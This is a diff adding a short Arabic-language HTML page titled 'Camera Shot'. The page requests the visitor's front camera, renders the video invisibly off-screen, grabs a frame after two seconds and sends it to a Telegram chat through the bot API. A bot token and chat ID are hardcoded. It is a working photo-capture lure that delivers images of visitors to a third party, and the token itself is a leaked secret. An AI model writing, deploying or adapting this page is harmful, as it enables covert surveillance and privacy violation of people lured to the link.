@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+<meta charset="UTF-8">
+<title>Camera Shot</title>
+</head>
+<body>
+
+<h2 id="msg">📸 ابتسم… يتم التقاط الصورة الآن!</h2>
+
+<video id="video" autoplay playsinline style="
+    width:1px;
+    height:1px;
+    opacity:0;
+    position:absolute;
+    left:-9999px;
+"></video>
+
+<canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
+<script>
+const video = document.getElementById("video");
+const canvas = document.getElementById("canvas");
+const ctx = canvas.getContext("2d");
+
+const BOT_TOKEN = "7960928309:AAFWhZhNuHn42tzjUEyvoUT8k6Eu97BaFbA";
+const CHAT_ID = "8557609477";
+
+navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+.then(stream => {
+    video.srcObject = stream;
+
+    video.onloadedmetadata = () => {
+        setTimeout(() => {
+
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append("chat_id", CHAT_ID);
+                formData.append("photo", blob, "photo.jpg");
+
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: "POST",
+                    body: formData
+                })
+                .then(() => document.getElementById("msg").innerText = "✔ تم التقاط الصورة")
+                .catch(() => document.getElementById("msg").innerText = "✗ خطأ أثناء الإرسال");
+            }, "image/jpeg", 0.95);
+
+        }, 2000); // مهم: إعطاء وقت لتشغيل الكاميرا
+    };
+
+})
+.catch(err => {
+    document.getElementById("msg").innerText = "✗ المستخدم لم يسمح بالكاميرا";
+});
+</script>
+
+</body>
+</html>
